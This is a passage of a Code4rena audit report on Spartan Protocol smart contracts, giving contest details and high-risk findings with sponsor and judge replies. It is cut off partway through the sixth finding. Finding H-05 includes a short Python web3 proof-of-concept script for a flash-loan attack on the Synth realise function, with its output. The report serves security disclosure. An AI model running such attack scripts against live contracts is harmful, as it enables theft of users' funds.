{
  "circa": {
    "title": "Spartan Protocol Contest",
    "sponsor": "Spartan Protocol",
    "slug": "2021-07-spartan",
    "date": "2021-09-16",
    "findings": "https://github.com/code-423n4/2021-07-spartan-findings/issues",
    "contest": 20
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code 432n4 (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 code contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the code contest outlined in this document, C4 conducted an analysis of Spartan smart contract system written in Solidity. The code contest took place between July 14—July 21.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>18 Wardens contributed reports to the Spartan code contest:</p>\n<ol>\n<li><a href=\"https://twitter.com/cmichelio\">cmichel</a></li>\n<li><a href=\"https://twitter.com/jonah1005w\">jonah1005</a></li>\n<li><a href=\"https://twitter.com/0xRajeev\">0xRajeev</a></li>\n<li><a href=\"https://github.com/x9453\">shw</a></li>\n<li><a href=\"https://twitter.com/HickupH\">hickuphh3</a></li>\n<li><a href=\"https://twitter.com/gpersoon\">gpersoon</a></li>\n<li><a href=\"https://github.com/0xsanson\">0xsanson</a></li>\n<li><a href=\"https://twitter.com/Tensors8\">tensors</a></li>\n<li><a href=\"https://twitter.com/a_delamo\">a_delamo</a></li>\n<li><a href=\"https://twitter.com/gallodasballo\">GalloDaSballo</a></li>\n<li><a href=\"https://github.com/SP-Nate\">natus</a></li>\n<li>maplesyrup (<a href=\"https://github.com/heiho1\">heiho1</a> and <a href=\"https://twitter.com/eriksal1217\">thisguy__</a>)</li>\n<li><a href=\"https://twitter.com/MukeshJ_eth\">Jmukesh</a></li>\n<li><a href=\"https://github.com/heiho1\">heiho1</a></li>\n<li><a href=\"https://twitter.com/_hrkrshnn\">hrkrshnn</a></li>\n<li><a href=\"https://twitter.com/zer0dots\">zer0dot</a></li>\n<li><a href=\"https://twitter.com/kylriley\">k</a></li>\n<li><a href=\"https://twitter.com/cranium7811\">7811</a></li>\n</ol>\n<p>This contest was judged by <a href=\"https://twitter.com/ghoulsol\">ghoul.sol</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/money_lego\">moneylegobatman</a> and <a href=\"https://twitter.com/_ninek_\">ninek</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 63 unique vulnerabilities. All of the issues presented here are linked back to their original finding</p>\n<p>Of these vulnerabilities, 13 received a risk rating in the category of HIGH severity, 15 received a risk rating in the category of MEDIUM severity, and 35 received a risk rating in the category of LOW severity.</p>\n<p>C4 analysis also identified 44 non-critical recommendations and 25 gas optimizations.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2021-07-spartan\">C4 Spartan Protocol code contest repository</a> is comprised of 29 smart contracts written in the Solidity programming language and included 2,506 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code423n4.com\">the C4 website</a>.</p>\n<h1 id=\"high-risk-findings-13\" style=\"position:relative;\"><a href=\"#high-risk-findings-13\" aria-label=\"high risk findings 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (13)</h1>\n<h2 id=\"h-01-synthvault-withdraw-forfeits-rewards\" style=\"position:relative;\"><a href=\"#h-01-synthvault-withdraw-forfeits-rewards\" aria-label=\"h 01 synthvault withdraw forfeits rewards permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/168\">[H-01] <code>SynthVault</code> withdraw forfeits rewards</a></h2>\n<p><em>Submitted by cmichel</em></p>\n<p>The <code>SynthVault.withdraw</code> function does not claim the user’s rewards. It decreases the user’s weight and therefore they are forfeiting their accumulated rewards.\nThe <code>synthReward</code> variable in <code>_processWithdraw</code> is also never used - it was probably intended that this variable captures the claimed rewards.</p>\n<p>Usually, withdrawal functions claim rewards first but this one does not. A user that withdraws loses all their accumulated rewards.</p>\n<p>Recommend claiming the rewards with the user’s deposited balance first in <code>withdraw</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/168#issuecomment-884642575\">verifyfirst (Spartan) confirmed but disagreed with severity</a>:</strong></p>\n<blockquote>\n<p>We understand there is a risk of losing unclaimed rewards if a user directly interacts with the synth-vault and not the DAPP.\nThis is a design choice to protect the withdrawal function.\nWe affirm the synthReward variable to be culled.</p>\n</blockquote>\n<h2 id=\"h-02-poolsol--synthsol-failing-max-value-allowance\" style=\"position:relative;\"><a href=\"#h-02-poolsol--synthsol-failing-max-value-allowance\" aria-label=\"h 02 poolsol  synthsol failing max value allowance permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/29\">[H-02] <code>Pool.sol</code> &#x26; <code>Synth.sol</code>: Failing Max Value Allowance</a></h2>\n<p><em>Submitted by hickuphh3, also found by shw, jonah1005, 0xRajeev and cmichel</em></p>\n<p>In the <code>_approve</code> function, if the allowance passed in is <code>type(uint256).max</code>, nothing happens (ie. allowance will still remain at previous value). Contract integrations (DEXes for example) tend to hardcode this value to set maximum allowance initially, but this will result in zero allowance given instead.</p>\n<p>This also makes the comment <code>// No need to re-approve if already max</code> misleading, because the max allowance attainable is <code>type(uint256).max - 1</code>, and re-approval does happen in this case.</p>\n<p>This affects the <code>approveAndCall</code> implementation since it uses <code>type(uint256).max</code> as the allowance amount, but the resulting allowance set is zero.</p>\n<p>Recommend keeping it simple and removing the condition.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"jsx\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">spender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;!owner&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">spender</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;!spender&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_allowances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">spender</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Approval</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">spender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/29#issuecomment-885456808\">SamusElderg (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>We acknowledge the issue in the max approval for approveAndCall, which we don’t use.\nFurthermore, the issue is only a problem if a user directly approves a maximum possible amount which would mean they are assuming trust in the contract.</p>\n<p>We will also change _approve in the pool and synth contracts.\nRisk, as outlined above, is low.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/29#issuecomment-894851446\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This is high risk as explained in #152</p>\n</blockquote>\n<h2 id=\"h-03-result-of-transfer--transferfrom-not-checked\" style=\"position:relative;\"><a href=\"#h-03-result-of-transfer--transferfrom-not-checked\" aria-label=\"h 03 result of transfer  transferfrom not checked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/8\">[H-03] Result of <code>transfer</code> / <code>transferFrom</code> not checked</a></h2>\n<p><em>Submitted by gpersoon, also found by jonah1005, zer0dot, 0xRajeev, JMukesh, cmichel, k, shw, 7811, heiho1 and maplesyrup.</em></p>\n<p>A call to <code>transferFrom</code> or <code>transfer</code> is frequently done without checking the results. For certain ERC20 tokens, if insufficient tokens are present, no revert occurs but a result of “false” is returned. It’s important to check this. If you don’t, you could mint tokens without have received sufficient tokens to do so and could loose funds. Its also a best practice to check this.</p>\n<p>Recommend always checking the result of <code>transferFrom</code> and <code>transfer</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/8#issuecomment-883828361\">verifyfirst (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>The intention was to not allow non-standard tokens with non-boolean returns however in the interest of future proofing the protocol we agree with this issue</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/8#issuecomment-894852860\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>There are a lot of reported issues in relation of non-standard ERC20 and <code>transfer</code> return values. Some wardens report it all in one issue, some divided it into multiple issues. To keep playing field equal, I’ll keep one issue per warden and make others invalid.</p>\n</blockquote>\n<h2 id=\"h-04-members-lose-sparta-tokens-in-removeliquiditysingle\" style=\"position:relative;\"><a href=\"#h-04-members-lose-sparta-tokens-in-removeliquiditysingle\" aria-label=\"h 04 members lose sparta tokens in removeliquiditysingle permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/133\">[H-04] Members lose SPARTA tokens in <code>removeLiquiditySingle()</code></a></h2>\n<p><em>Submitted by 0xRajeev, also found by cmichel and XXX</em></p>\n<p>When a member calls <code>removeLiquiditySingle()</code> requesting only SPARTA in return, i.e. <code>toBASE</code> = true, the LP tokens are transferred to the Pool to withdraw the constituent SPARTA and TOKENs back to the Router. The withdrawn TOKENs are then transferred back to the Pool to convert to SPARTA and directly transferred to the member from the Pool. However, the member’s SPARTA are left behind in the Router instead of being returned along with converted SPARTA from the Pool.</p>\n<p>In other words, the <code>_member</code>’s BASE SPARTA tokens that were removed from the Pool along with the TOKENs are never sent back to the<code>_member</code> because the <code>_token</code>’s transferred to the Pool are converted to SPARTA and only those are sent back to member directly from the Pool via <code>swapTo()</code>.</p>\n<p>This effectively results in member losing the SPARTA component of their Pool LP tokens which get left behind in the Router and are possibly claimed by future transactions that remove SPARTA from Router.</p>\n<p><a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L121\">LPs sent to Pool</a>, <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L122\">SPARTA and TOKENs withdrawn from Pool to Router</a>, <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L126\">TOKENs from Router sent to Pool</a>, and <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L127\">TOKENs in Pool converted to BASE SPARTA and sent to member directly from the Pool</a>.</p>\n<p><strong>Recommend</strong>:</p>\n<ol>\n<li>BASE SPARTA should also be transferred to the Pool before <code>swapTo()</code> so they get sent to the member along with the converted TOKENs via <code>swapTo()</code></li>\n<li>Use <code>swap(BASE)</code> instead of <code>swapTo()</code> so that TOKENs are swapped for BASE SPARTA in Pool and sent back to ROUTER. Then send all the SPARTA from ROUTER to member.</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/133#issuecomment-884607584\">verifyfirst (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>This bug was missed in a last minute edit before pushing to code423n4, wouldn’t have made it past testNet testing.\nHowever, it is a good find.</p>\n</blockquote>\n<h2 id=\"h-05-synth-realise-is-vulnerable-to-flash-loan-attacks\" style=\"position:relative;\"><a href=\"#h-05-synth-realise-is-vulnerable-to-flash-loan-attacks\" aria-label=\"h 05 synth realise is vulnerable to flash loan attacks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/40\">[H-05] Synth <code>realise</code> is vulnerable to flash loan attacks</a></h2>\n<p><em>Submitted by jonah1005, also found by a</em>delamo_</p>\n<p>Synth <code>realise</code> function calculates <code>baseValueLP</code> and <code>baseValueSynth</code> base on AMM spot price which is vulnerable to flash loan attack. <code>Synth</code>’s lp is subject to <code>realise</code> whenever the AMM ratio is different than Synth’s debt ratio.</p>\n<p>The attack does not necessarily require a flash loan. A big whale of the lp token holders could keep calling <code>realise</code> by shifting token ratio of AMM pool back and forth.</p>\n<p>The vulnerability is located at <code>Synth.sol</code> <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L187-L199\">L187-L199</a>. Where the formula <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L114-L126\">here</a> is dangerous.</p>\n<p>Here’s a script for conducting flashloan attack:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"python\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">flashloan_amount = init_amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">user = w3.eth.accounts[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">marked_token.functions.transfer(user, flashloan_amount).transact()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">marked_token.functions.transfer(token_pool.address, flashloan_amount).transact({</span><span class=\"mtk8\">&#39;from&#39;</span><span class=\"mtk1\">: user})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">token_pool.functions.addForMember(user).transact({</span><span class=\"mtk8\">&#39;from&#39;</span><span class=\"mtk1\">: user})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">received_lp = token_pool.functions.balanceOf(user).call()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">synth_balance_before_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">token_synth.functions.realise(token_pool.address).transact()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">token_pool.functions.transfer(token_pool.address, received_lp).transact({</span><span class=\"mtk8\">&#39;from&#39;</span><span class=\"mtk1\">: user})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">token_pool.functions.removeForMember(user).transact({</span><span class=\"mtk8\">&#39;from&#39;</span><span class=\"mtk1\">: user})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">token_synth.functions.realise(token_pool.address).transact()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">synth_balance_after_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">print</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;synth_lp_balance_after_realise&#39;</span><span class=\"mtk1\">, synth_balance_after_realise)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">print</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;synth_lp_balance_before_realise&#39;</span><span class=\"mtk1\">, synth_balance_before_realise)</span></span></span></code></pre>\n<p>Output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">synth_balance_after_realise 1317859964829313908162</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">synth_balance_before_realise 2063953488372093023256</span></span></code></pre>\n<p>Calculating Lp token’s value base on AMM protocol is known to be dangerous.\nThere are a few steps that might solve the issue:</p>\n<ol>\n<li>calculate token’s price from a reliable source.  Implement a TWAP oracle or uses chainlink oracle.</li>\n<li>calculate lp token value based on anti-flashloan formula.  Alpha finance’s formula is a good reference: <a href=\"https://blog.alphafinance.io/fair-lp-token-pricing\">https://blog.alphafinance.io/fair-lp-token-pricing</a></li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/40#issuecomment-883856664\">verifyfirst (Spartan) confirmed and disagreed with severity</a>:</strong></p>\n<blockquote>\n<p>A proposal has been suggested to limit the use of realise() for a DAO proposal. This will allow only liquidity providers to choose the outcome of a function that directly affects them.</p>\n</blockquote>\n<h2 id=\"h-06-synthvault-rewards-can-be-gamed\" style=\"position:relative;\"><a href=\"#h-06-synthvault-rewards-can-be-gamed\" aria-label=\"h 06 synthvault rewards can be gamed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/166\">[H-06] <code>SynthVault</code> rewards can be gamed</a></h2>\n<p><em>Submitted by cmichel</em></p>\n<p>The <code>SynthVault._deposit</code> function adds <code>weight</code> for the user that depends on the spot value of the deposit synth amount in <code>BASE</code>.</p>\n<p>This spot price can be manipulated and the cost of manipulation is relative to the pool’s liquidity.\nHowever, the reward (see <code>calcReward</code>) is measured in BASE tokens unrelated to the pool.\nTherefore, if the pool’s liquidity is low and the reward 